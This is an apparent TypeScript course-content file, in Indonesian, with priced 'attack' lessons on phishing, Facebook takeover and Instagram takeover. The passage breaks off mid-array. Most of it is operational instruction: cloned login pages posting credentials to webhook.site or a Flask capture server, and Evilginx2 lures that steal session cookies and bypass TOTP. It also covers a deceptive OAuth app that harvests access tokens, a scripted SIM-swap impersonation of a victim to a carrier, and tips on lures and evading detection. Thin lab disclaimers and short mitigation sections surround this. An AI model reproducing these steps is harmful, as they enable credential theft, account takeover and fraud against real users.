// CyberEd — Materi Serangan Sosial: Phishing, FB Takeover, IG Takeover
// Semua string menggunakan double-quote outer dengan \" escape untuk inner quotes
import type { MateriData } from "../materi-content/runner";

export const seranganSocial: MateriData[] = [
  // ============================ PHISHING ============================
  {
    judul: "🎣 Phishing — Pancing User Klik dengan Halaman Palsu",
    emoji: "🎣",
    deskripsi: "Pelajari cara setup halaman login palsu yang identik dengan aslinya, distribusi via email + WhatsApp, dan cara MFA-aware phishing yang bypass OTP.",
    level: "pemula",
    harga: 15000,
    hargaCoret: 25000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham konsep phishing (social engineering), mampu membuat halaman klon dari target (untuk lab), dan distribusi sehingga user tertipu. Plus: memahami pertahanan yang umum.",
    analogy: "Bayangkan penipu yang pakai masker persis artis terkenal dan bicara di tempat umum. Orang mengira dia artis tersebut — mereka semangat foto, bayar mahal untuk meeting, padahal penipu collect data dan uang. Phishing persis: halaman login palsu identical dengan bank favorite Anda.",
    apaItu: "Phishing adalah serangan social engineering di mana attacker membuat halaman tiruan (clone) dari situs legit (bank, e-commerce, social media), lalu distribusikan supaya user tertipu dan login ke halaman attacker.\n\nJenis:\n1) Email phishing: link dalam email Body yang link ke fake page\n2) Smishing: link via SMS/WhatsApp/Telegram\n3) Spear phishing: target spesifik (CEO/CFO), research lebih dalam\n4) Whaling: target high-value (CEO/board)",
    caraKerja: "1) Attacker identify target (misal: bank-bank di Indonesia atau e-commerce besar)\n2) Clone front-page login dengan tools seperti GoPhish, SET (Social Engineering Toolkit), atau manual copy HTML\n3) Host clone di domain mirip (kecil beda: bankir-bca.com vs klikbca.com — typo sering susah sadar)\n4) Kirim email blast: Update akun Anda → link ke clone\n5) User klik link → halaman IDENTIK login original → user isi email + password\n6) Form submit ke server attacker → password masuk ke attacker\n7) Attacker sekarang punya email + password user → bisa login langsung ke original bank",
    asciiDiagram: "ATTACKER SETUP:\n   clone page  ---->  hosted at fake-domain.com\n\nDISTRIBUSI:\n   EMAIL: Update BCA Anda terbaru: klik ini\n   +--- link: http://fake-domain.com/bca-login\n\nVICTIM FLOW:\n   1) Buka email\n   2) Klik link → fake-domain.com (TIDAK klikbca.com asli!)\n   3) Lihat UI IDENTIK BCA asli\n   4) Isi user + password → submit\n   5) FORM DATA TERKIRIM KE ATTACKER\n   6) Attacker redirect ke BCA asli setelah POST\n      → user mengira login sukses, tidak sadar",
    senjata: {
      pc: "GoPhish (open source phishing framework, untuk lab simulasi internal), Social Engineering Toolkit (SET) di Kali Linux, web hosting gratis untuk host clone page, domain murah (Namecheap / Porkbun), Mailgun/Sendgrid untuk kirim email test (kalau lab resmi).",
      hp: "HP Android untuk RDP lab. Email testing dari Gmail account lab.",
    },
    metode: [
      {
        nama: "Metode 1: Setup Lab Phishing dengan GoPhish (Pemula)",
        level: "pemula",
        deskripsi: "GoPhish adalah framework open source untuk simulate phishing attack (untuk lab resmi). Lebih cepat dari manual copy HTML.",
        prasyarat: [
          "Linux/Mac/Windows",
          "GoPhish binary dari getgophish.com (free)",
          "Lab environment (VM isolated)",
          "Peserta lab yang mengerti/diberi tahu bahwa ini simulasi",
        ],
        langkah: [
          {
            judul: "Download + extract GoPhish",
            aksi: "Kalian buka getgophish.com. Download versi OS. Untuk Linux: wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip && unzip gophish-v0.12.1-linux-64bit.zip && cd gophish-v0.12.1-linux-64bit",
            command: "wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip\nunzip gophish-v0.12.1-linux-64bit.zip\ncd gophish-v0.12.1-linux-64bit",
            expected: "Folder GoPhish berisi binary.",
          },
          {
            judul: "Start GoPhish server",
            aksi: "Jalankan: chmod +x gophish && ./gophish. Output menampilkan URL admin (https://127.0.0.1:3333) dan credential default. Login admin UI.",
            command: "./gophish",
            expected: "GoPhish server jalan. Login admin di https://127.0.0.1:3333.",
          },
          {
            judul: "Setup profile email pengirim",
            aksi: "Kalian di GoPhish admin: tab Sending Profiles → New Profile. Untuk lab, pakai akun Gmail pribadi (atau SMTP test account: Mailtrap.io free). Isi host, port, username, password.",
            expected: "Sending profile ready.",
          },
          {
            judul: "Compose email template + landing page",
            aksi: "Template email: tab Email Templates → New. Subject urgent. Body: link {{.URL}}. Landing page: tab Landing Pages → New. Import Site disabled (tidak fetch real prod site). Manual HTML mirip target + form action ke GoPhish capture.",
            expected: "Template + landing page aktif.",
          },
          {
            judul: "Kirim campaign ke email lab sendiri",
            aksi: "Tab Campaigns → New Campaign. Pilih sending profile + email template + landing page + group of users (untuk lab, email lab sendiri). Send Now.",
            expected: "Email masuk ke inbox target. Klik link → landing page muncul. Submit form → GoPhish admin panel capture credentials.",
          },
        ],
        outputAkhir: "Berhasil membuat campaign phishing simulation lab-ready dengan GoPhish. Email blast + landing page + credential capture all functional.",
        kesalahanUmum: [
          { masalah: "Template fetch production site tidak jalan", solusi: "Untuk lab resmi dengan izin, biasanya pakai phishlet alih-alih langsung clone." },
          { masalah: "Email masuk spam", solusi: "SPF/DKIM/DMARC belum set → email masuk spam. Untuk lab, pakai domain Anda sendiri + setup SPF/DKIM di DNS." },
        ],
      },
      {
        nama: "Metode 2: Manual Clone Page + Host di Netlify (Menengah)",
        level: "menengah",
        deskripsi: "Tanpa GoPhish, clone page secara manual + host di Netlify drop. Cepat untuk PoC, cocok untuk simulasi social engineering awareness training.",
        prasyarat: [
          "Akun Netlify gratis (sign up via email)",
          "Browser Chrome + DevTools",
          "Halaman login yang akan di-clone (target lab, dengan izin)",
        ],
        langkah: [
          {
            judul: "Inspect target login page",
            aksi: "Kalian buka target login di Chrome. Klik kanan → View Source. Atau tekan F12 → tab Elements. Copy HTML form bagian. Identifikasi: form action url, input fields (username, password), button submit.",
            expected: "HTML form teridentifikasi.",
          },
          {
            judul: "Buat HTML clone sederhana",
            aksi: "Buat file clone.html. Tulis ulang halaman login simple dengan UI mirror. Form action post ke webhook.site:\n<form action=\"https://webhook.site/YOUR-UNIQUE-ID\" method=\"POST\">\n  <input name=\"username\" placeholder=\"Email\">\n  <input name=\"password\" type=\"password\" placeholder=\"Password\">\n  <button type=\"submit\">Login</button>\n</form>",
            expected: "File HTML clone dengan form action ke webhook.site.",
          },
          {
            judul: "Host clone di Netlify drop",
            aksi: "Buka app.netlify.com/drop. Drag-and-drop folder berisi clone.html (rename jadi index.html). Netlify auto-generate subdomain.",
            expected: "URL Netlify unik aktif.",
          },
          {
            judul: "Distribusi (simulasi lab)",
            aksi: "Untuk lab internal: kirim URL Netlify ke diri sendiri via email/WhatsApp. Lihat apakah halaman mirror identik dengan original. Klik submit → webhook.site capture POST data.",
            catatan: "Tanpa izin resmi, distribusi URL apapun yang menipu user adalah ilegal. Hanya untuk lab training.",
          },
        ],
        outputAkhir: "Berhasil membuat clone page live di Netlify. Workflow cepat untuk simulasi PAT.",
        kesalahanUmum: [
          { masalah: "Halaman clone tidak identik dengan original", solusi: "Inspect ASCII art + CSS + gambar. Highlight perbedaan user akan notice (font berbeda, warna button, layout responsive rusak)." },
        ],
      },
      {
        nama: "Metode 3: AitM Phishing (Evilginx2) Bypass 2FA",
        level: "lanjut",
        deskripsi: "Evilginx2 adalah Adversary-in-the-Middle reverse proxy. Berdiri antara victim dan real site, capture session cookie setelah 2FA.",
        prasyarat: [
          "VPS Linux murah (Vultr $5/bulan, DigitalOcean)",
          "Domain sendiri + subdomain wildcard (*.phishlab.com)",
          "Evilginx2 binary dari GitHub",
          "Izin resmi untuk simulasi target",
        ],
        langkah: [
          {
            judul: "Setup VPS + domain wildcard",
            aksi: "Beli VPS Ubuntu 22.04. Beli domain misal phishlab.com. Tambah DNS A record: *.phishlab.com → VPS_IP. Ini jadi subdomain lure.",
            expected: "VPS ready, domain wildcard resolve.",
          },
          {
            judul: "Install Evilginx2",
            aksi: "SSH ke VPS. Install Go lalu download Evilginx2:\ngit clone https://github.com/kgretzky/evilginx2.git\ncd evilginx2\nmake\nAtau download binary prebuilt dari release page.\nJalankan: ./evilginx2",
            command: "./evilginx2",
            expected: "Evilginx2 prompt muncul.",
          },
          {
            judul: "Setup phishlet (template phishing)",
            aksi: "Phishlet adalah YAML config yang define target (misal Microsoft 365, Google, GitHub). Untuk Microsoft:\nphishlets hostname microsoft mysubdomain.phishlab.com\nphishlets enable microsoft\nlures create microsoft\nlures get-url 0  # dapat URL lure",
            command: "phishlets hostname microsoft mysub.phishlab.com\nphishlets enable microsoft\nlures create microsoft\nlures get-url 0",
            expected: "URL lure terbentuk: https://mysub.phishlab.com/oauth/...",
          },
          {
            judul: "Kirim lure URL ke target (lab)",
            aksi: "Untuk lab resmi, kirim URL ke target via email/WhatsApp awareness training. Target klik → Evilginx proxy login Microsoft → target fill email + password → target input 2FA (TOTP / push) → Evilginx forward semua ke Microsoft → Microsoft return session cookie → Evilginx capture cookie → setelah login sukses, redirect target ke halaman Microsoft asli.\n\nAttacker di dashboard Evilginx melihat captured session cookies. Pakai cookie di browser sendiri = login sebagai user.",
            expected: "Session cookie target tertangkap di dashboard Evilginx. Attacker sekarang bisa impersonasi target.",
            catatan: "Lab ini break TOTP! Tapi tidak break FIDO2 (WebAuthn hardware key signature bound to origin domain).",
          },
        ],
        outputAkhir: "Berhasil setup Evilginx2 AitM proxy + bypass TOTP 2FA + capture session cookies. Pemahaman mendalam kenapa FIDO2 lebih kuat.",
        kesalahanUmum: [
          { masalah: "Phishlet tidak jalan / URL error", solusi: "Pastikan wildcard DNS A record setup benar. Cek dengan dig: dig mysub.phishlab.com" },
          { masalah: "Target pakai FIDO2 → AitM gagal", solusi: "FIDO2 cryptographic proof tied ke origin domain. AitM capture tidak bisa replay. FIDO2 = defense paling kuat vs phish." },
        ],
      },
    ],
    mitigasi: "Pertahanan dari phishing:\n\n1. User Training: sering-sering simulasi phishing awareness training. Edukasi tentang URL check, hover untuk preview, cek HTTPS certificate.\n2. Email Security: SPF, DKIM, DMARC DNS records. Spam filter modern (Mimecast, Proofpoint, atau built-in Gmail/Outlook).\n3. Web Browser: Chrome/Firefox built-in anti-phishing check (Google Safe Browsing, SmartScreen).\n4. Password Manager: hanya autofill di domain yang match.\n5. FIDO2 / Hardware Key: Anti-phishing by design. Tidak bisa di-AitM proxy karena signature proves origin domain.\n6. Conditional Access (Azure AD): Session policy restrict country/IP + device compliance.",
    latihan: [
      "Setup GoPhish di VM. Buat campaign ke email lab Anda. Capture credential milik sendiri untuk lab.",
      "Clone page login sandbox (DVWA). Host di Netlify drop.",
      "Setup Evilginx2 di VPS murah (Vultr $5/bulan). Generate lure URL untuk simulasi awareness training ke teman dekat yang setuju.",
      "Pelajari cara kerja FIDO2: pakai security key (YubiKey) di lab → test AitM phish gagal bypass.",
    ],
    faq: [
      { q: "Apakah phishing bisa bypass 2FA?", a: "Dengan AitM proxy (Evilginx2), yes — proxy real login, grab session cookie setelah 2FA input. Tapi FIDO2/WebAuthn (hardware key) tidak bisa AitM-bypass." },
      { q: "Apakah Gmail / Microsoft 365 aman dari phishing?", a: "Tidak 100%. Advanced phishing dengan AitM masih bisa bypass." },
      { q: "Bagaimana cara cek email phising?", a: "Hover link untuk lihat URL asli. Cek dengan teliti: typo domain, HTTPS tidak cukup, urgent tone." },
      { q: "Phishing legal kalau saya lab internal?", a: "Hanya dengan izin tertulis dan scope jelas. Tanpa izin = ilegal." },
    ],
    ringkasan: [
      "Phishing = clone page + social engineering + credential capture",
      "Distribution: email, WhatsApp, social media direct",
      "Tools lab: GoPhish, Social Engineering Toolkit (SET)",
      "Advanced: Evilginx2 AitM untuk bypass 2FA (hanya lab resmi)",
      "Defense: training + email filter + password manager + FIDO2",
    ],
    materiRelated: ["Session Hijacking", "WAF Setup", "Secure Coding"],
  } as MateriData,

  // ============================ FACEBOOK TAKEOVER ============================
  {
    judul: "👤 Facebook Account Takeover — Curi Akun FB + Reset Password",
    emoji: "👤",
    deskripsi: "Pelajari berbagai metode takeover akun Facebook: session theft via XSS, password reset flow abuse, OAuth phishing, dan token interception di lab.",
    level: "menengah",
    harga: 18000,
    hargaCoret: 28000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham surface attack Facebook account takeover, mampu lab demo reset password flow attack dengan waktu-bounded phishing, dan paham defense (FIDO2 enrolled di FB).",
    analogy: "Bayangkan kunci rumah anda di-copy oleh tukang kunci nakal — kunci baru bisa buka rumah tanpa anda tahu. Account takeover persis: attacker boleh akses account FB anda, reset password, lock original owner out.",
    apaItu: "Facebook Account Takeover (ATO) adalah serangan di mana attacker mendapatkan akses penuh account Facebook target dan mengubah credential sehingga original owner tidak bisa login.\n\nVector umum:\n1) Reset password abuse: social engineering FB Help Center\n2) Session cookie theft via phishing/XSS\n3) OAuth abuse: third-party app yang minta permission berlebihan\n4) SIM swap: takeover nomor HP → reset SMS OTP\n5) Email compromise: takeover email first → reset FB password",
    caraKerja: "Flow ATO paling umum via reset password + social engineering:\n1) Attacker identify target FB account\n2) Klik 'Forgot password' di halaman login\n3) Pilih 'Send me code via email' atau 'Send SMS'\n4) Tunggu code masuk (kalau akses email/nomor HP target attacker punya dari earlier compromise)\n5) Submit code → reset password\n6) Login sebagai target\n\nFlow lainnya:\n- Phishing page FB:\n  - Domain mirip: faceb00k.com, login-fb.com\n  - Submit creds → attacker capture → replay ke FB asli\n- OAuth App Abuse:\n  - App third-party minta permission list_friends, publish\n  - Persisted token attacker punya → akses tanpa password",
    asciiDiagram: "RESET PASSWORD ATTACK FLOW:\n\n  ATTACKER         FACEBOOK         VICTIM EMAIL/NOMOR\n     |                |                     |\n     |--[Forgot password]->|              |\n     |<--[Choose recovery]--|              |\n     |--[Send code to email]>|              |\n     |                |--[email code]--->|\n     |<--[Code]------|  (via SMTP)         |\n     |--[Submit code + new password]>|     |\n     |                |--[Verify]-->|\n     |<--[Password reset OK]---|      |\n     |                |              |\n     +--[Login dengan new creds]-->|\n     |                |              |\n\nSESSION HIJACKING ALTERNATIVE:\n  Phish page -> User submit creds\n  Cookie session -> Attacker gunakan cookie\n  Server FB anggap attacker = user",
    senjata: {
      pc: "Browser Chrome/Firefox + DevTools. GoPhish atau Evilginx2 untuk phish. Burp Suite untuk inspect request FB OAuth.",
      hp: "Browser mobile untuk reset password flow. Sebaiknya dilakukan di PC (lebih cepat lab turnaround).",
    },
    metode: [
      {
        nama: "Metode 1: OAuth Permission Abuse (Pemula)",
        level: "pemula",
        deskripsi: "Cara paling umum yang sering tidak diketahui user: third-party app yang granted access ke FB. Attacker yang punya akses app = akses ke FB user tanpa password.",
        prasyarat: [
          "Akun FB untuk lab",
          "App third-party yang akan jadi attacker (boleh create di Facebook Developers)",
        ],
        langkah: [
          {
            judul: "Setup attacker app di Facebook Developers",
            aksi: "Buat app baru di developers.facebook.com. Set:\n- App name: Video Downloader FB / Free Gift FB\n- App type: Consumer\n- Add product: Facebook Login\n- Valid OAuth Redirect: http://localhost:8080/callback\n\nSettings → Permissions: minta permission seperti user_posts, user_friends (tidak boleh approve production tanpa review oleh FB).",
            expected: "App ID + App Secret tersedia.",
          },
          {
            judul: "Build phishing authorization page",
            aksi: "Generate URL OAuth:\nhttps://www.facebook.com/dialog/oauth?client_id=APP_ID&redirect_uri=http://localhost:8080/callback&scope=user_posts,user_friends,email,public_profile&response_type=token\n\nKirim URL ke target via DM atau post. Target klik → lihat halaman request permission dari attacker app → allow → attacker dapat access token.",
            command: "https://www.facebook.com/dialog/oauth?client_id=APP_ID&redirect_uri=http://localhost:8080/callback&scope=email,public_profile,user_friends&response_type=token",
            expected: "URL OAuth generated. Target setelah klik + allow akan di-redirect ke callback dengan access_token.",
          },
          {
            judul: "Capture access token di callback",
            aksi: "Setup simple HTTP server di laptop Anda untuk receive callback:\nfrom http.server import HTTPServer\n# ketika access_token tiba, log dan store\nSaat target allow, redirect ke: http://localhost:8080/callback#access_token=XXX\nAnda catat token.",
            expected: "Access token target tertangkap.",
          },
          {
            judul: "Gunakan access token untuk Graph API",
            aksi: "Sekarang attacker punya access token tanpa password target. Graph API calls:\ncurl https://graph.facebook.com/me?access_token=ACCESS_TOKEN\nAtau pakai tools: facebook-sdk Python:\nimport facebook\ngraph = facebook.GraphAPI(access_token=ACCESS_TOKEN)\nprint(graph.get_object('me'))\n\nToken masih valid selama scope masih granted. Untuk long-lived: tukar short-lived token ke long-lived (60 hari) via endpoint /oauth/access_token.",
            command: "curl https://graph.facebook.com/me?access_token=ACCESS_TOKEN",
            expected: "Profile target (name, email, friends) ter-expose. Attacker login ke FB target via OAuth token replay.",
          },
        ],
        outputAkhir: "Berhasil OAuth abuse attack: target grant app 3rd-party → attacker dapat access_token → Graph API calls succeed tanpa password.",
        kesalahanUmum: [
          { masalah: "Target selalu cek permission list dan ragu", solusi: "Lab simulation. Real-world: attacker pakai urgency (limited offer 'giveaway', count down timer)." },
          { masalah: "App rejection saat Facebook review", solusi: "Untuk lab pakai FB Development mode dengan test users. Untuk social engineering hero: app bisa di-submit production dengan loot offer." },
        ],
      },
      {
        nama: "Metode 2: Reset Password dengan SIM Swap (Menengah)",
        level: "menengah",
        deskripsi: "SIM swap attack: attacker convince provider seluler bahwa mereka owner nomor → provider transfer nomor ke SIM attacker → reset password via SMS.",
        prasyarat: [
          "Target informasi personal (nama lengkap, tanggal lahir, alamat) untuk social engineering provider",
          "Lab: research process dari provider seluler target",
          "Mental model: SIM swap adalah metode paling senior (red team / high-value target)",
        ],
        langkah: [
          {
            judul: "Research + collect info target",
            aksi: "Untuk SIM swap: attacker perlu minimal paket info personal target:\n- Nama lengkap (OSINT LinkedIn / Facebook)\n- Tanggal lahir (Facebook posts, friend birthday list)\n- SSN / KTP / NIK (data breach, social engineering)\n- Alamat (Facebook check-in history)\n- Phone number terakhir (cari di Truecaller / GetContact)",
            expected: "Paket OSINT terkumpul.",
          },
          {
            judul: "Kontak provider seluler (social engineering)",
            aksi: "Telepon provider customer service. Claim: 'Saya ingin aktivasi SIM baru karena HP hilang. Atas nama [target name], tanggal lahir [target DOB], nomor [target phone]. Alamat sesuai KTP: [target address]'\n\nProvider verification biasanya lemah — beberapa pertanyaan setuju-true untuk valid customer service rep. Peluang.",
            expected: "Provider memberi nomor baru ke SIM attacker (lab simulation spec).",
          },
          {
            judul: "Activate new SIM + intercept SMS",
            aksi: "Setelah provider transfer nomor → SIM attacker aktif. Semua SMS / telepon ke nomor target forward ke attacker. Sekarang attacker:\n- Reset FB password → SMS OTP tiba ke attacker\n- Login ke FB target\n- Set 2FA baru (authenticator app attacker)",
            expected: "Attacker punya akses penuh ke FB target via SMS reset.",
            catatan: "SIM swap serius ilegal. Lab simulation gunakan targeted scenario dengan permission. Atau baca dokumentasi provider untuk simulasi.",
          },
        ],
        outputAkhir: "Pemahaman SIM swap attack vector. Defense: PIN SMS / Port Protection dari provider, FIDO2 enrollment di FB (tidak butuh SMS).",
        kesalahanUmum: [
          { masalah: "Provider seluler block / freeze aktivasi", solusi: "Beberapa provider punya port protection feature. Untuk defensive: aktifkan port freeze account Anda." },
          { masalah: "Tidak punya cukup info target untuk convince provider", solusi: "Bisa juga pakai insider attack — orang dalam provider collaborate. Real attack biasanya require ini." },
        ],
      },
      {
        nama: "Metode 3: Session Cookie Theft via AitM Phish (Lanjut)",
        level: "lanjut",
        deskripsi: "Pakai Evilginx2 atau AitM phish custom untuk intercept session cookie FB target setelah login + 2FA.",
        prasyarat: ["VPS Linux + domain wildcard", "Evilginx2 binary (dari GitHub)", "Lab target account sendiri"],
        langkah: [
          {
            judul: "Setup Evilginx2 dengan Facebook phishlet",
            aksi: "Aktifkan phishlet facebook:\nphishlets hostname facebook myfbsub.phishlab.com\nphishlets enable facebook\nlures create facebook\nlures get-url 0\n\nURL lure dari Evilginx2 stand in antara target dan FB. Lure URL: https://myfbsub.phishlab.com/facebook-login",
            expected: "URL lure aktif.",
          },
          {
            judul: "Trigger lure ke target",
            aksi: "Untuk lab: kirim URL ke target via WhatsApp/social engineering narrative ('Saya menemukan foto lucu Anda, cek di sini').",
            expected: "Target klik URL.",
          },
          {
            judul: "Capture session cookie",
            aksi: "Target flow:\n- Lihat login FB clone (di proxy)\n- Submit email + password\n- Input 2FA (TOTP / push)\n- Login sukses\n- Evilginx2 capture session cookie dari response FB → yang sebenarnya untuk target browser\n- Attacker di dashboard Evilginx dapat cookie\n\nSekarang attacker pakai cookie di browser sendiri:\n1) Login ke facebook.com\n2) Set cookie c_user=X... + xs=Y... via DevTools Application tab\n3) Refresh → Anda login sebagai target",
            expected: "Session cookie tertangkap di dashboard Evilginx2. Attacker import ke browser sendiri = logged in sebagai target tanpa input password.",
            catatan: "TOTP 2FA bypassed! Tapi FIDO2 hardware key tidak bisa AitM bypass.",
          },
        ],
        outputAkhir: "Berhasil bypass TOTP 2FA Facebook via AitM Evilginx2 + session cookie capture.",
        kesalahanUmum: [
          { masalah: "Cookie tidak valid saat import ke browser", solusi: "Pastikan IP sama persis. Atau pakai tools automatic (evilginx2 sudah ada automation)" },
          { masalah: "FIDO2 enrolled di FB → AitM gagal", solusi: "Defense terbaik. Jika belum diaktifkan, victim ATO-able." },
        ],
      },
    ],
    mitigasi: "Pertahanan Facebook Account Takeover:\n\n1. FIDO2 / Hardware Key: Enroll YubiKey di Facebook login (Settings → Security and Login → Use two-factor authentication → Security key). Anti-AitM by design.\n2. Unique strong password tiap akun + Password Manager\n3. Periodic checkup app 3rd-party: Settings → Security and Login → Apps and Websites → remove yang tidak perlu\n4. Aktifkan login alerts (notifikasi email jika login dari device baru)\n5. Port Protection dari provider seluler (minta provider aktivasi fitur ini)\n6. Jangan share terlalu banyak info personal di FB public (DOB address KK)",
    latihan: [
      "Buat 2 akun FB (target + attacker). Lab OAuth abuse — connect target ke app attacker dengan minimal permission, verify Graph API dapat data.",
      "Setup Evilginx2 di VPS. Gunakan phishlet facebook. Capture cookie akun lab Anda sendiri.",
      "Latihan OSINT: dari nama + foto, coba kumpulkan informasi yang cukup untuk simulasi SIM swap (lab social engineering scenario).",
      "Aktifkan FIDO2 / Hardware Key di FB akun Anda sendiri. Test AitM attack gagal payload.",
    ],
    faq: [
      { q: "Apakah Facebook bisa diretas langsung dari platform?", a: "Facebook platform sendiri sangat aman. Attack biasanya social engineering target, bukan hack FB backend." },
      { q: "Apakah FIDO2 di FB butuh akun lagi?", a: "Tinggal enable di Settings. Gratis (FB support built-in WebAuthn)." },
      { q: "Bagaimana cek app mana saja yang punya akses FB saya?", a: "Settings → Security and Login → Apps and Websites. Buang yang tidak perlu / sudah tidak digunakan." },
      { q: "Apakah nomor HP recover setelah SIM swap?", a: "Provider transfer kembali, tapi attacker biasanya sudah selesai exploitation. Damage done." },
    ],
    ringkasan: [
      "FB ATO vector: OAuth abuse, SIM swap, AitM phish, session cookie theft",
      "Paling sederhana: app 3rd-party dengan permission berlebihan",
      "SIM swap high-impact tapi butuh social engineering provider",
      "AitM phish (Evilginx2) bypass TOTP, tidak bypass FIDO2",
      "Defense utama: FIDO2 enrollment + unique strong password + audit app 3rd-party",
    ],
    materiRelated: ["Phishing", "Session Hijacking", "MFA", "OAuth Security"],
  } as MateriData,

  // ============================ INSTAGRAM TAKEOVER ============================
  {
    judul: "📷 Instagram Account Takeover — Akses Akun IG + Reset Password",
    emoji: "📷",
    deskripsi: "Pelajari takeover akun Instagram: attack dari email compromise, session cookie dari phishing IG, dan recovery abuse.",
    level: "menengah",
    harga: 18000,
    hargaCoret: 28000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham attack surface Instagram takeover, mampu demo reset password flow attack, dan tahu defense Instagram (autentikasi 2FA + login dikonfirmasi).",
    analogy: "Bayangkan akun IG usaha kecil yang dibangun bertahun-tahun. Attacker ambil alih → post scam ke followers, atau hold account untuk ransom. Sama seperti FB takeover tapi vector spesifik IG.",
    apaItu: "Instagram Account Takeover (ATO) adalah serangan夺取 akses akun Instagram (yang sering terjadi pada akun usaha / influencer). Vector umumnya termasuk:\n\n1) Email takeover first → reset password IG\n2) Phishing IG clone (ig-help-center.com dll) → session cookie / password\n3) SIM swap + SMS recovery\n4) Session ID / cookie vuln via XSS di IG web (jarang tapi ada bug bounty)\n5) Third-party apps dengan permission berlebihan",
    caraKerja: "Reset password IG flow:\n1) Attacker buka https://instagram.com/accounts/password/reset\n2) Input username / email target\n3) IG kirim email reset atau SMS ke email / no HP target\n4) Attacker yang punya akses email (lewat takeover) atau SIM swap → dapat link reset\n5) Set password baru → login IG full control\n\nCookie theft via IG seperti FB:\n1) Target buka link phish misal 'special_filter_instagram.com'\n2) Submit IG credentials\n3) Attacker replay / capture session cookie\n4) Login IG via cookie (kalau tidak ada additional checks)",
    asciiDiagram: "INSTAGRAM ATO FLOW VIA EMAIL:\n\n  ATTACKER              IG              TARGET EMAIL\n     |                    |                  |\n     |--[Forgot password username]>|         |\n     |--[Send reset email]>|        |         |\n     |              |--[Reset URL]--->|\n     |<--[Email forward]------|  (kompro)\n     |--[Click reset + new password]>|    |\n     |              |--[Verify token]>|    |\n     |<--[Login OK new creds]--|      |\n\nSESSION HIJACKING VIA PHISH:\n  Victim: klik link fake-help-center -> login IG\n  Phish: capture uname + password + cookie\n  Attacker: di browser sendiri pakai cookie -> login gratis sebagai victim\n\nIG NEW DEVICE PROTECTION:\n  Kalau attacker login IP/device baru IG butuh kode admin dari email → defense layer kedua.",
    senjata: {
      pc: "Browser Chrome/Firefox + DevTools. GoPhish atau Evilginx2 untuk phish IG. Python script untuk Instagram Graph API calls (kalau masih bisa).",
      hp: "IG official app untuk reset password flow. Sebaiknya lab di PC.",
    },
    metode: [
      {
        nama: "Metode 1: Reset Password via Compromised Email (Pemula)",
        level: "pemula",
        deskripsi: "Vector paling umum: attacker punya akses ke email target (Gmail/Yahoo compromised via data breach / phishing first) → pakai untuk reset IG password.",
        prasyarat: [
          "Komprehensif email target (lab: setup 2 akun email, salah satunya compromised scenario)",
          "Username IG target (knowledge)",
          "Lab izin resmi",
        ],
        langkah: [
          {
            judul: "Verify IG account via email",
            aksi: "Buka https://instagram.com/accounts/password/reset. Username: target_ig. Pilih 'Send Email'. IG kirim link reset ke email target.",
            command: "https://instagram.com/accounts/password/reset",
            expected: "IG mengirim email reset ke target's email.",
          },
          {
            judul: "Akses email compromised",
            aksi: "Karena attacker punya akses email target (lab: gunakan email akun ke-2 lab Anda yang compro scenario), buka inbox. Email dari Instagram dengan subject Reset Your Password.",
            expected: "Email reset terkonfirmasi di inbox attacker.",
          },
          {
            judul: "Klik reset link + set password baru",
            aksi: "Klik link di email IG → IG password reset page. Set password baru (strong password, jangan pakai password yang sebelumnya dipakai). Confirm.",
            expected: "Password IG target di-reset attacker.",
          },
          {
            judul: "Login IG target + setup 2FA attacker",
            aksi: "Sekarang attacker login ke IG target dengan:\n1) Username + password baru\n2) IG mungkin kirim kode SMS / push kalau ada other checks\n3) Untuk lab, kalau full compro email, biasanya SSH bypass\n\nSetelah login, attacker ENABLE 2FA authenticator AT atau nomor HP attacker → permanent lock out original owner.",
            expected: "Attacker login IG target + lock out original owner.",
          },
        ],
        outputAkhir: "Berhasil takeover akun IG dengan pakai compro email sebagai vector. Pemahaman chain attack: email compro → social account compro.",
        kesalahanUmum: [
          { masalah: "Reset link hilang di archive", solusi: "Akses email compro lebih awal. Atau pakai SIM swap alternative." },
          { masalah: "IG detect suspicious activity & block", solusi: "Untuk lab, gunakan VPN + IP wajar. Atau pelan-pelan (jangan rapid-fire reset attemp)." },
        ],
      },
      {
        nama: "Metode 2: Phishing IG Login Page (Menengah)",
        level: "menengah",
        deskripsi: "Clone page login IG + host + kirim link ke target via DM atau post.",
        prasyarat: ["Domain serupa (misal instagram-security-center.com)", "Hosting (Netlify / Vercel)", "TLS certificate (Let's Encrypt)"],
        langkah: [
          {
            judul: "Clone IG login page",
            aksi: "Kalian buka instagram.com/login lalu save HTML / screenshot. Atau pakai tool visual clone via httrack:\nhttrack \"https://instagram.com/accounts/login\" -O ~/ig-clone\nEdit action form untuk post ke server attacker.",
            command: "httrack \"https://instagram.com/accounts/login\" -O ~/ig-clone -*.facebook.com",
            expected: "Folder ~/ig-clone berisi mirror IG login.",
          },
          {
            judul: "Setup phish endpoint untuk capture credential",
            aksi: "Kalian setup HTTP server Flask / Express untuk receive POST:\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/login', methods=['POST'])\ndef login():\n    user = request.form.get('username')\n    pw = request.form.get('password')\n    # log ke DB\n    print(f'CAPTURED: {user} / {pw}')\n    return redirect('https://instagram.com')  # redirect victim",
            command: "python3 phish_app.py",
            expected: "Phish server running. POST capture ke DB.",
          },
          {
            judul: "Upload ke Netlify + publish",
            aksi: "Edit form action HTML clone: <form action=\"https://YOUR-PHISH-DOMAIN.com/login\"> untuk capture. Drag-and-drop folder ke Netlify drop. Netlify kasih subdomain publik.",
            expected: "Domain phish aktif.",
          },
          {
            judul: "Distribusi link ke target",
            aksi: "Untuk lab resmi: kirim link via WhatsApp narasi 'IG Anda kena hack, verify di sini'. Atau untuk lab sekolah/kampus, email security awareness training.\n\nBuka link → lihat halaman IG-identical → submit creds → captured ke phish server → attacker GET creds.",
            expected: "Credential target tertangkap. Attacker login IG target dengan credential langsung.",
            catatan: "Attack ini ilegal tanpa izin. Lab resmi dengan continuous info + kesadaran target wajib.",
          },
        ],
        outputAkhir: "Berhasil phish IG credentials + login attacker ke IG target.",
        kesalahanUmum: [
          { masalah: "Halaman clone berbeda dengan original (URL berbeda)", solusi: "Gunakan domain mirip (ig-security-help.com vs instagram.com). SSL certificate wajib untuk HTTPS." },
          { masalah: "Target tidak klik link", solusi: "Soci engineering narrative penting — target perlu trust. Lab: jelaskan target awal." },
        ],
      },
      {
